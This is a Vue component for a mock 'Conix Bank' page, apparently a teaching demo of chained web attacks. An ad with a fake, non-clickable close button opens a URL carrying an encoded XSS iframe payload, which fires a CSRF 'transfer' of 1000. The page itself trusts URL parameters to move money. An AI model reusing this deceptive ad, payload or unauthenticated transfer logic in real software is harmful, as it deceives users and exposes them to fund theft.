<template>
    <div class="wrapper">
        <h2>Welcome Conix Bank</h2>
        <div>
            {{ name }} 你好！您的余额是 {{ money }}
        </div>
        <p v-if="money < 0">你已透支。请尽快补全余额，否则我行将采取法律方式。</p>
    </div>
    <div class="adv" @click="handle_click">
        <button>关闭</button>
        <img src="https://tvax1.sinaimg.cn/large/007kZ47kgy1gqizz0ipr0g30f008f7wj.gif">
    </div>
</template>

<script>

export default {
    data() {
        return {
            name: localStorage.getItem("name"),
            money: localStorage.getItem("money")
        }
    },
    methods: {
        handle_click() {
            window.open(`https://wuuconix.tk/static/xss/?q=%3Ciframe%20src=%22https%3A%2F%2Fwuuconix%2Etk%2Fstatic%2Fcsrf%2F%3Fmethod%3Dtransfer%26amount%3D1000%22%20style=%22display:%20none%22%3E%3C/iframe%3E`, "_blank")
        }
    },
    mounted() {
        window.addEventListener('storage', (e) => { //实现不同标签页之间的监听
            console.log("localStorage发生变化 money进行更新", e)
            this.money = e.newValue
        });
        let name = localStorage.getItem("name")
        if (name == null) {
            name = window.prompt("欢迎使用本银行，请问您的名字是？")
            localStorage.setItem("name", name)
            localStorage.setItem("money", 1000)
            window.location.reload()
        }
        let url = new URL(window.location.href)
        let method = url.searchParams.get("method")
        let amount  = url.searchParams.get("amount")
        if (method == "transfer" && amount !== null) {
            localStorage.setItem("money", localStorage.getItem("money") - Number(amount))
        }
    }
}
</script>

<style>
    * {
        margin: 0;
        padding: 0;
    }
    div.wrapper {
        width: 100%;
        height: 80vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }
    p {
        height: 32px;
        line-height: 32px;
        text-align: center;
        color: crimson;
    }
    div.adv {
        position: absolute;
        width: 25vw;
        height: 25vh;
        right: 2px;
        bottom: 2px;
        overflow: hidden;
    }
    img {
        width: 100%;
        height: 100%;
        object-fit: cover;
        border-radius: 15px;
    }
    button {
        display: block;
        position: absolute;
        width: 10%;
        height: 10%;
        top: 0;
        right: 0;
        user-select: none;
        pointer-events: none;
    }
</style>